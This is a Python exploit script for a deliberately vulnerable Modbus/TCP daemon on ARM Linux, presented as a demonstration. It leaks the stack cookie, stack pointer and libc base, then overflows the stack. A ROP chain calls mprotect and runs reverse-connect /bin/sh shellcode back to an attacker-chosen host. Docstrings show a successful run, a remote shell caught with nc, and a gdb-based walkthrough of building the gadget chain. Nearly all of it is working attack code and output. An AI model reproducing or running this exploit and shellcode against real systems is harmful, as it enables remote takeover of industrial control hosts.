#!/usr/bin/env python

"""
DummyModbusSVC exploit

Demonstration exploit for the vulnerable DummyModbusSVC frontend daemon.
Exploits a stack buffer overflow in fully-hardened (ASLR+NX+Stack Cookies+Full RELRO) DummyModbusSVC daemon using a partial-XOP payload.

Target: Linux/ARM, Raspbian 4.1.17+ armv6l, glibc-2.19

root@debian:~/ut/demotarget# python dummysploit.py 192.168.0.102 1502 192.168.0.104 4919
[+] Opening connection to 192.168.0.102 on port 1502: Done
[*] Sending infoleak request...
[+] Got stackpointer: [be895640]
[+] Got stack cookie: [52102a00]
[+] Got libc base: [b6e14000]
[*] Building ROP chain...
[*] Argument-setting gadget: [b6ee8294]
[*] Dispatcher gadget: [b6e737e4]
[*] mprotect address: [b6ee1c30]
[*] shellcode address: [be895680]
[*] Sending exploit request...
[*] Closed connection to 192.168.0.102 port 1502

pi@raspberrypi:~/demotarget $ ./dummyserver 
The client connection from 192.168.0.104 is accepted
Waiting for a indication...
<00><01><00><00><00><06><00><03><00><00><00><06>
[00][01][00][00][00][0F][00][03][0C][BE][89][56][40][52][10][2A][00][B6][E1][40][00]
Waiting for a indication...
<00><02><00><00><00><8F><00><10><00><01><00><44><88><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><00><2A><10><52><DE><C0><AD><0B><94><82><EE><B6><00><50><89><BE><FF><0F><00><00><07><00><00><00><30><1C><EE><B6><DE><C0><AD><0B><E4><37><E7><B6><DE><C0><AD><0B><80><56><89><BE><01><10><8F><E2><11><FF><2F><E1><02><20><01><21><92><1A><0F><02><19><37><01><DF><06><1C><08><A1><10><22><02><37><01><DF><3F><27><02><21><30><1C><01><DF><01><39><FB><D5><05><A0><92><1A><05><B4><69><46><0B><27><01><DF><C0><46><02><00><13><37><C0><A8><00><68><2F><62><69><6E><2F><73><68><00><42>
[00][02][00][00][00][06][00][10][00][01][00][44]
Waiting for a indication...

root@debian:~# nc -l -p 4919
id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi)
uname -a
Linux raspberrypi 4.1.17+ #838 Tue Feb 9 12:57:10 GMT 2016 armv6l GNU/Linux
"""

import sys
from pwn import *
from socket import inet_aton
from struct import pack, unpack
from gadgets import arm_gadgets

def get_blocks(data, block_size):
	return [data[i:i+block_size] for i in range(0, len(data), block_size)]

def build_modbus_request(transaction_id, protocol_id, msg_len, unit_id, function_code, payload):
	return pack('>H', transaction_id) + pack('>H', protocol_id) + pack('>H', msg_len) + pack('B', unit_id) + pack('B', function_code) + payload

def build_read_payload(data_address, register_count):
	return pack('>H', data_address) + pack('>H', register_count)

def build_write_payload(data_address, register_count, databytes_to_follow, payload):
	return pack('>H', data_address) + pack('>H', register_count) + pack('B', databytes_to_follow) + payload

# Construct Linux/ARM reverse-connect TCP /bin/sh shellcode
def build_shellcode(ip_addr, port):
	return "\x01\x10\x8F\xE2\x11\xFF\x2F\xE1\x02\x20\x01\x21\x92\x1a\x0f\x02\x19\x37\x01\xdf\x06\x1c\x08\xa1\x10\x22\x02\x37\x01\xdf\x3f\x27\x02\x21\x30\x1c\x01\xdf\x01\x39\xfb\xd5\x05\xa0\x92\x1a\x05\xb4\x69\x46\x0b\x27\x01\xdf\xc0\x46\x02\x00" + pack('>H', port) + inet_aton(ip_addr) + "\x2f\x62\x69\x6e\x2f\x73\x68\x00"

def info_leak(client):
	# read holding registers (function code 03), address = 0, count = 6
	transaction_id = 0x0001
	protocol_id = 0x0000
	msg_len = 0x0006
	unit_id = 0x00
	function_code = 0x03
	data_address = 0x0000
	register_count = 0x0006

	read_payload = build_read_payload(data_address, register_count)
	request = build_modbus_request(transaction_id, protocol_id, msg_len, unit_id, function_code, read_payload)

	print "[*] Sending infoleak request..."

	client.send(request)
	response = client.recv(21)

	# extract leaked info from response
	stack_pointer = unpack('>I', response[9:13])[0]
	stack_cookie = unpack('>I', response[13:17])[0]
	libc_base = unpack('>I', response[17:21])[0]

	return libc_base, stack_cookie, stack_pointer

"""
gdb-peda$ r
The client connection from 192.168.0.102 is accepted
Waiting for a indication...
<00><01><00><00><00><CD><00><10><00><01><00><63><C6><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF><BE><EF>
[00][01][00][00][00][06][00][10][00][01][00][63]
Waiting for a indication...
<00><02><00><00><00><06><00><03><00><01><00><63>
[00][02][00][00][00][C9][00][03][C6][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][D3][00][00][00][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF][BE][EF]
Waiting for a indication...
ERROR Connection reset by peer: read

Program received signal SIGSEGV, Segmentation fault.
0xbeefbeee in ?? ()

registers = [0x4141]*reg_count
registers[13] = 0x0506
registers[14] = 0x0304
registers[15] = 0x0102

0x05414141	0x01040306

0x01040304 in ?? ()

registers = [0x4141]*reg_count
registers[13] = 0x41EF
registers[14] = 0xBEAD
registers[15] = 0xDE41

Program received signal SIGSEGV, Segmentation fault.
0xdeadbeee in ?? ()

Since we have to close our socket to trigger the exploit condition and since this is a demonstration (not an evasive test) exploit we will go for the
regular partial-XOP payload, ie. a mprotect XOP stub followed by a regular shellcode payload (a reverse TCP shell on port 0x1337 = 4919)

The XOP stub looks as follows:

	mprotect(shellcode_address, shellcode_len, PROT_READ|PROT_WRITE|PROT_EXEC)

Since we are on ARM we need to set:

	R0 = shellcode_address
	R1 = shellcode_len = 72
	R2 = PROT_READ|PROT_WRITE|PROT_EXEC = 7

Note that mprotect requires the address argument be page-aligned so we take (shellcode_address & 0xfffff000) and set len = 0xfff (which should suffice for our shellcode)

Lets take a look at the disassembly of mprotect:

	.text:000C80C0 mprotect                                ; CODE XREF: sub_6D6B0+98p
	.text:000C80C0                                         ; sub_6FA70+A80p
	.text:000C80C0                 MOV     R12, R7
	.text:000C80C4                 MOV     R7, #0x7D
	.text:000C80C8                 SVC     0
	.text:000C80CC                 MOV     R7, R12
	.text:000C80D0                 CMN     R0, #0x1000
	.text:000C80D4                 BXCC    LR
	.text:000C80D8                 B       syscall_error

We can see that upon successful exit from the mprotect function we execute BXCC LR (branch-and-exchange when carry-flag is clear to LR).
This means that when we enter mprotect LR must be set to the address of the next gadget or shellcode. This is different from a partial-XOP stub on x86 where the CALL/RET calling convention makes it slightly easier to include a 'fake' mprotect call in our chain.

So we need to find a gadget or sequence of gadgets that first sets R0, R1 and R2 to the mprotect arguments and then one that sets LR to our shellcode address.
In order to achieve the latter we effectively have to find a dispatcher gadget which contains a linked-branch followed by a pop-based 'return'.

We find the following in libc at <fopen + 0x1C>:

	.text:0005F7E4                 BLX     R3
	.text:0005F7E8                 LDMFD   SP!, {R3,PC}

Now we need a gadget sequence that sets r0, r1 and r2 to the mprotect arguments and r3 to the mprotect address.

We find the following in libc at <mcount + 0x14>:

	.text:000D4294                 LDMFD   SP!, {R0-R3,R11,PC}

This allows us to set r0, r1, r2 and r3 and branch to the next gadget

Which gives the XOP sequence:

	* arg_gadget
	* (shellcode_address & 0xfffff000) -> r0
	* (len = 0xfff) -> r1
	* protection flags -> r2
	* mprotect -> r3
	* new_fp -> fp
	* dispatch_gadget -> pc
	* junk
	* shellcode_address

"""
def do_exploit(client, libc_version, libc_base, stack_cookie, stack_pointer, connectback_ip, connectback_port):
	# Overflow size
	overflow_size = (27 - 8)

	print "[*] Building ROP chain..."

	shellcode = build_shellcode(connectback_ip, connectback_port)

	# Offsets from libc base to ROP chain elements
	mcount_offset = arm_gadgets['libc'][libc_version]['mcount']
	fopen_offset = arm_gadgets['libc'][libc_version]['fopen']
	mprotect_offset = arm_gadgets['libc'][libc_version]['mprotect']
	shellcode_offset = 28 + (9*4)					# shellcode offset from leaked stack pointer (9 DWORDs in ROP chain)

	# Determine ROP Chain element addresses
	ARG_gadget = (libc_base + mcount_offset + 0x14)			# <mcount+0x14>
	MPROTECT_addr = (libc_base + mprotect_offset)			# mprotect
	DISP_gadget = (libc_base + fopen_offset + 0x1C)			# <fopen+0x1C>
	shellcode_address =	(stack_pointer + shellcode_offset)	# shellcode_address
	shellcode_len = 0xfff									# shellcode_len
	protection_flags = 7 									# PROT_READ|PROT_WRITE|PROT_EXEC
	new_fp = stack_pointer									# point fp to a valid stack location in case ROP chain would need that
	junk = 0x0BADC0DE                               		# filler junk

	print "[*] Argument-setting gadget: [%x]" % ARG_gadget
	print "[*] Dispatcher gadget: [%x]" % DISP_gadget
	print "[*] mprotect address: [%x]" % MPROTECT_addr
	print "[*] shellcode address: [%x]" % shellcode_address
	
	rop_chain = "".join([pack('<I', x) for x in [ARG_gadget, (shellcode_address & 0xfffff000), shellcode_len, protection_flags, MPROTECT_addr, new_fp, DISP_gadget, junk, shellcode_address]])

	payload = ("\x41" * overflow_size) + pack('<I', stack_cookie) + pack('<I', new_fp) + rop_chain + shellcode

	# pad payload so it is a multiple of 16 bits
	payload += ("\x42" * (len(payload) % 2))

	# write registers (function code 10), address = 1, registers constructed from payload string
	transaction_id = 0x0002
	protocol_id = 0x0000
	msg_len = (0x0007 + len(payload))
	unit_id = 0x00
	function_code = 0x10
	data_address = 0x0001
	register_count = (len(payload) / 2)
	databytes_to_follow = len(payload)

	write_payload = build_write_payload(data_address, register_count, databytes_to_follow, payload)
	request = build_modbus_request(transaction_id, protocol_id, msg_len, unit_id, function_code, write_payload)

	print "[*] Sending exploit request..."
	client.send(request)

	# We need to close socket to trigger exploit condition (return from modbus_task)
	client.close()
	return

assert (len(sys.argv) == 5), ("[-] Usage: python %s <target_ip> <target_port> <connectback_ip> <connectback_port>" % sys.argv[0])

# Target host, modbus service port
#host = '192.168.0.102'
#port = 1502
host = sys.argv[1]
port = int(sys.argv[2])
client = remote(host, port, timeout = None)

# Shellcode connect-back info
#connectback_ip = '192.168.0.104'
#connectback_port = 0x1337
connectback_ip = sys.argv[3]
connectback_port = int(sys.argv[4])

# Target libc version
libc_version = '2.19'

# Use infoleak
libc_base, stack_cookie, stack_pointer = info_leak(client)

print "[+] Got stackpointer: [%x]" % stack_pointer
print "[+] Got stack cookie: [%x]" % stack_cookie
print "[+] Got libc base: [%x]" % libc_base

# Execute exploit
do_exploit(client, libc_version, libc_base, stack_cookie, stack_pointer, connectback_ip, connectback_port)